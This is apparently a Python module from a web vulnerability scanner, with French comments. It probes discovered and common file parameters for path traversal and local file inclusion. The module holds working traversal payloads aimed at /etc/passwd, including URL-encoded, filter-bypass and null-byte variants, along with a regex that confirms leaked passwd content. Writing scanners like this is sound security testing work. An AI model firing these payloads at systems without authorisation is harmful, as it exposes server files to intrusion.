"""Path traversal / LFI : payloads classiques sur les paramètres découverts,
plus une variante null-byte (%2500) sur les endpoints de fichiers découverts.
Confirmation stricte par la signature `/etc/passwd`."""
from __future__ import annotations

import re

from ..scan_models import Finding
from .base import MAX_TARGETS_PER_MODULE
from ._util import merged_param_targets, with_query_param

TRAVERSAL_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
]
PASSWD_RE = re.compile(r"root:.*:0:0:")

# Repli intégré : endpoints/paramètres de type "fichier" courants toujours
# sondés, même sans rien découvert par le crawl (SPA peu explorable).
COMMON_ENDPOINTS = ["/download", "/file", "/static", "/assets", "/ftp"]
COMMON_PARAMS = ["file", "path", "filename", "document", "page"]


def t_path_traversal(ctx) -> list[Finding]:
    """Sonde CHAQUE (endpoint, paramètre) découvert/repli PUIS chaque
    endpoint GET (variante null-byte), et confirme TOUTES les instances
    (une par cible, dès le premier payload concluant)."""
    out: list[Finding] = []
    targets = merged_param_targets(ctx.sitemap, ctx.origin, COMMON_ENDPOINTS, COMMON_PARAMS)
    targets = targets[:MAX_TARGETS_PER_MODULE]
    for base_url, param in targets:
        for pl in TRAVERSAL_PAYLOADS:
            target = with_query_param(base_url, param, pl)
            st, _, body = ctx.safe_get(target)
            if st == 200 and PASSWD_RE.search(body or ""):
                out.append(Finding("traversal", "path-traversal-lfi", "critical", target,
                                   "Contenu de /etc/passwd divulgué", request=f"GET {target}"))
                break

    endpoints = [ep for ep in list(ctx.sitemap.endpoints) + list(ctx.sitemap.api_endpoints)
                if ep.method.upper() == "GET"][:MAX_TARGETS_PER_MODULE]
    for ep in endpoints:
        target = ep.url + "%2500"
        st, _, body = ctx.safe_get(target)
        if st == 200 and PASSWD_RE.search(body or ""):
            out.append(Finding("traversal", "path-traversal-null-byte", "critical", target,
                               "Contenu de /etc/passwd divulgué via bypass null byte",
                               request=f"GET {target}"))
    return out


ATTACKS = [
    ("traversal", "Path traversal / LFI", t_path_traversal),
]
